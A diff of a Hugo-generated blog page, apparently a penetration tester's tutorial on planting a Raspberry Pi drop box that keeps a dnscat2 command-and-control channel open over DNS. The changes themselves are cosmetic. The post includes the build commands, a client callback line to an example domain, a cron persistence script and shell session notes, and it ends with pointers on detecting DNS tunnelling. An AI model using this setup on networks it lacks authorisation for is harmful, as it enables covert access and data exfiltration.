@@ -3,7 +3,7 @@
 <head>
   <link href="https://gmpg.org/xfn/11" rel="profile">
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <meta name="generator" content="Hugo 0.60.1" />
+  <meta name="generator" content="Hugo 0.88.1" />
 
   
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -44,7 +44,7 @@
       </ul>
     </nav>
 
-    <p>&copy; 2020. All rights reserved. </p>
+    <p>&copy; 2021. All rights reserved. </p>
   </div>
 </aside>
 
@@ -52,7 +52,7 @@
     <div class="post">
   <h1>Persistent C2 with dnscat2</h1>
   <time datetime=2016-12-19T17:19:40-0800 class="post-date">Mon, Dec 19, 2016</time>
-  <p>Occasionally an environment has strict outbound rules with all traffic going through an authenticated proxy. This hampers exfiltration, especially if you don't currently have valid credentials but need a foothold into an environment without phishing for instance. If we can find a live network jack in some accessible place and the switch hands out an IP address via DHCP along with DNS servers, we can more than likely obtain a foothold into the network.</p>
+  <p>Occasionally an environment has strict outbound rules with all traffic going through an authenticated proxy. This hampers exfiltration, especially if you don&rsquo;t currently have valid credentials but need a foothold into an environment without phishing for instance. If we can find a live network jack in some accessible place and the switch hands out an IP address via DHCP along with DNS servers, we can more than likely obtain a foothold into the network.</p>
 <p>Thanks to some awesome work by <a href="https://twitter.com/iagox86">iagox86</a>, these directions can be used to configure <a href="https://github.com/iagox86/dnscat2">dnscat2</a> to automatically connect back to your server over DNS in an automated fashion, similar to a PwnPlug.</p>
 <h2 id="prerequisites">Prerequisites</h2>
 <ul>
@@ -85,7 +85,7 @@
 $ cd dnscat2/client/
 $ make
 </code></pre>
-<p>At this point you can run dnscat2 with the following to confirm things are working. We'll be coming back to this so no need to keep in running.</p>
+<p>At this point you can run dnscat2 with the following to confirm things are working. We&rsquo;ll be coming back to this so no need to keep in running.</p>
 <pre><code>$ sudo /home/rpi/dnscat2/client/dnscat --secret=verysecret --dns domain=ns1.example.com,type=TXT
 </code></pre>
 <ul>
@@ -93,8 +93,8 @@ $ make
 <li>You can specify various DNS record types but TXT records have been fairly stable for me in the past</li>
 </ul>
 <h4 id="configure-persistance">Configure Persistance</h4>
-<p>We want our little remote computer to always be connected to us. Every time it's plugged in, dnscat2 should be calling back to our infrastructure. In addition, DNS can be flaky so we always want to ensure there's always a callback.</p>
-<p>Make <code>eth0</code> ask for a DHCP address everytime it's plugged in</p>
+<p>We want our little remote computer to always be connected to us. Every time it&rsquo;s plugged in, dnscat2 should be calling back to our infrastructure. In addition, DNS can be flaky so we always want to ensure there&rsquo;s always a callback.</p>
+<p>Make <code>eth0</code> ask for a DHCP address everytime it&rsquo;s plugged in</p>
 <pre><code>$cat /etc/networking/interfaces
   auto eth0
   allow-hotplug eth0
@@ -113,18 +113,18 @@ $chmod +x /home/rpi/start_dnscat2
 #!/bin/bash
 
 if ! $(ps aux | grep -i &quot;[t]mux&quot; &gt; /dev/null); then
-    echo &quot;[!] Starting dnscat2...&quot;
+	echo &quot;[!] Starting dnscat2...&quot;
         /home/rpi/start_dnscat2
 else
-    echo &quot;[+] dnscat2 is running...&quot;
+	echo &quot;[+] dnscat2 is running...&quot;
 fi
 
 $crontab -e
 */5 * * * * /home/rpi/check_and_start_dnscat2.sh
 </code></pre>
-<p>That's it. Now whenever an interface comes up, dnscat2 will make a connection to the configured domain and check every 5 minutes if there is a connection, starting one if not.</p>
+<p>That&rsquo;s it. Now whenever an interface comes up, dnscat2 will make a connection to the configured domain and check every 5 minutes if there is a connection, starting one if not.</p>
 <h3 id="dnscat2-reference">dnscat2 reference</h3>
-<p>dnscat2 isn't super intuitive so some operational notes for quick reference:</p>
+<p>dnscat2 isn&rsquo;t super intuitive so some operational notes for quick reference:</p>
 <ul>
 <li>Start the server under a tmux session</li>
 <li>Within the dnscat2 prompt, type <code>sessions</code> to see what you have available and interact with <code>sessions -i 1</code></li>
@@ -132,10 +132,10 @@ $crontab -e
 <li>Exit the shell session by <code>Control-z</code> or <code>exit</code></li>
 </ul>
 <h3 id="identifying-dnscat2-on-the-wire">Identifying dnscat2 on the wire</h3>
-<p>There are number of ways to identify malicious DNS traffic and <a href="https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152">this SANS paper</a> details quite a few methods of identification. In addition, in this case we're specifying TXT records which aren't too common. [One paper] (<a href="http://www.caida.org/publications/papers/2007/dns_anomalies/dns_anomalies.pdf">http://www.caida.org/publications/papers/2007/dns_anomalies/dns_anomalies.pdf</a>) (Table 1) puts TXT record usage around 7% of a given large sample size. <a href="http://blog.dinaburg.org/2012/11/bitsquatting-pcap-analysis-part-2-query.html">Another</a> puts that usage at closer to less than 1%.</p>
-<p>It's difficult to directly prevent DNS tunnelling but with a bit of traffic and payload analysis an attacker who's not careful is likely to be identified.</p>
+<p>There are number of ways to identify malicious DNS traffic and <a href="https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152">this SANS paper</a> details quite a few methods of identification. In addition, in this case we&rsquo;re specifying TXT records which aren&rsquo;t too common. [One paper] (<a href="http://www.caida.org/publications/papers/2007/dns_anomalies/dns_anomalies.pdf">http://www.caida.org/publications/papers/2007/dns_anomalies/dns_anomalies.pdf</a>) (Table 1) puts TXT record usage around 7% of a given large sample size. <a href="http://blog.dinaburg.org/2012/11/bitsquatting-pcap-analysis-part-2-query.html">Another</a> puts that usage at closer to less than 1%.</p>
+<p>It&rsquo;s difficult to directly prevent DNS tunnelling but with a bit of traffic and payload analysis an attacker who&rsquo;s not careful is likely to be identified.</p>
 <h3 id="resources">Resources</h3>
-<p>Most of this info is from iagox86's github and Lenny Zeltser's write up on dnscat2.</p>
+<p>Most of this info is from iagox86&rsquo;s github and Lenny Zeltser&rsquo;s write up on dnscat2.</p>
 <ul>
 <li><a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a></li>
 <li><a href="https://github.com/iagox86/dnscat2/blob/master/doc/authoritative_dns_setup.md">https://github.com/iagox86/dnscat2/blob/master/doc/authoritative_dns_setup.md</a></li>
